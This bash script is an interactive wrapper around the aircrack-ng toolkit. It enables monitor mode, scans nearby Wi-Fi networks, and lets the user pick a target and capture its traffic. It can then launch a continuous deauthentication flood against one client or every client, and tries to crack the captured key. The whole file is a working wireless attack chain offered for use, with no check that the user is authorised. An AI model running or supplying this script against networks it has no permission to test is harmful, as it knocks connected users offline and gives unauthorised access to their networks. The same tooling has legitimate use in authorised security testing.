#!/bin/bash

# Interactive Wrapper for Aircrack-NG Toolset

# Function to check if Aircrack-NG is installed
check_aircrack() {
    if ! command -v aircrack-ng &>/dev/null; then
        echo "Aircrack-ng is not installed. Installing..."
        sudo apt-get update
        sudo apt-get install -y aircrack-ng
    else
        echo "Aircrack-ng is already installed."
    fi
}

# Function to list wireless interfaces
list_interfaces() {
    echo "Available wireless interfaces:"
    interfaces=($(iwconfig 2>&1 | grep 'IEEE' | awk '{print $1}'))
    for i in "${!interfaces[@]}"; do
        echo "$((i + 1)). ${interfaces[$i]}"
    done
    read -p "Select an interface (number): " iface_num
    interface="${interfaces[$((iface_num - 1))]}"
}

# Function to enable monitor mode
enable_monitor_mode() {
    sudo airmon-ng start "$interface"
    monitor_interface="${interface}mon"
    echo "Monitor mode enabled on $monitor_interface"
}

# Function to open a new terminal window
open_new_terminal() {
    if command -v gnome-terminal &>/dev/null; then
        gnome-terminal -- "$@"
    elif command -v xterm &>/dev/null; then
        xterm -e "$@"
    elif command -v konsole &>/dev/null; then
        konsole -e "$@"
    else
        echo "No supported terminal emulator found."
        exit 1
    fi
}

# Function to scan for networks
scan_networks() {
    echo "Scanning for networks..."
    sudo airodump-ng "$monitor_interface" -w scan_results --output-format csv &
    scan_pid=$!
    sleep 10
    sudo kill "$scan_pid"

    echo "Available networks:"
    network_list=()
    index=1
    while IFS=',' read -r bssid _ _ channel _ _ _ _ _ _ _ _ _ essid _; do
        if [[ "$bssid" == "Station MAC" || -z "$bssid" ]]; then
            break
        fi
        if [[ "$bssid" != "BSSID" ]]; then
            echo "$index: ESSID: $essid | BSSID: $bssid | Channel: $channel"
            network_list+=("$bssid,$channel,$essid")
            ((index++))
        fi
    done < <(grep -v 'BSSID,' scan_results-01.csv)
}

# Function to select target network
select_network() {
    read -p "Enter the number of the network to target: " net_num
    selected_network="${network_list[$((net_num - 1))]}"
    IFS=',' read -r bssid channel essid <<<"$selected_network"
    echo "Selected Network: ESSID: $essid | BSSID: $bssid | Channel: $channel"
}

# Function to capture data
capture_data() {
    read -p "Enter filename prefix for capture files: " capture_file
    open_new_terminal sudo airodump-ng --bssid "$bssid" --channel "$channel" -w "$capture_file" "$monitor_interface"
}

# Function to perform deauthentication attack
deauth_attack() {
    read -p "Do you want to perform a deauthentication attack? [y/N]: " deauth_choice
    if [[ "$deauth_choice" =~ ^[Yy]$ ]]; then
        read -p "Enter the client MAC address (or 'broadcast' for all clients): " client_mac
        if [[ "$client_mac" == "broadcast" ]]; then
            sudo aireplay-ng --deauth 0 -a "$bssid" "$monitor_interface"
        else
            sudo aireplay-ng --deauth 0 -a "$bssid" -c "$client_mac" "$monitor_interface"
        fi
    fi
}

# Function to crack the key
crack_key() {
    read -p "Press Enter to attempt to crack the key..."
    sudo aircrack-ng "${capture_file}-01.cap"
}

# Function to clean up
cleanup() {
    sudo airmon-ng stop "$monitor_interface"
    echo "Monitor mode disabled on $monitor_interface"
}

# Main script execution
check_aircrack
list_interfaces
enable_monitor_mode
scan_networks
select_network
capture_data
deauth_attack
crack_key
cleanup
